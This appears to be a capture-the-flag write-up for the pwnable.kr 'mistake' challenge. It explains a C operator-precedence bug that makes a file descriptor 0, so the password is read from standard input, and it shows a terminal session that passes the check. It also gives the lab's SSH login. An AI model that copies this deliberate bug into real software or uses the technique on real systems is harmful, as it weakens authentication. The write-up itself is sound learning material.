# Description
We all make mistakes, let's move on.
(don't take this too seriously, no fancy hacking skill is required at all)

This task is based on real event
Thanks to dhmonkey

hint : operator priority

ssh mistake@pwnable.kr -p2222 (pw:guest)

# Vulnerability
```c
if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
		printf("can't open password %d\n", fd);
		return 0;
}
```
In this code, maybe programmer wanted to give fd with open function's return value and checks whether it is less than 0 or not.

As operator priority, `open("/home/mistake/password",O_RDONLY,0400) < 0` executed first and give the value to fd.

```c
if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
		printf("read error\n");
		close(fd);
		return 0;		
}
```
Now It receives `pw_buf` with stdin(like scanf).

# Exploitation
```
mistake@ubuntu:~$ ./mistake 
do not bruteforce...
0000000000
input password : 1111111111
Password OK
Mommy, the operator priority always confuses me :(
mistake@ubuntu:~$
```
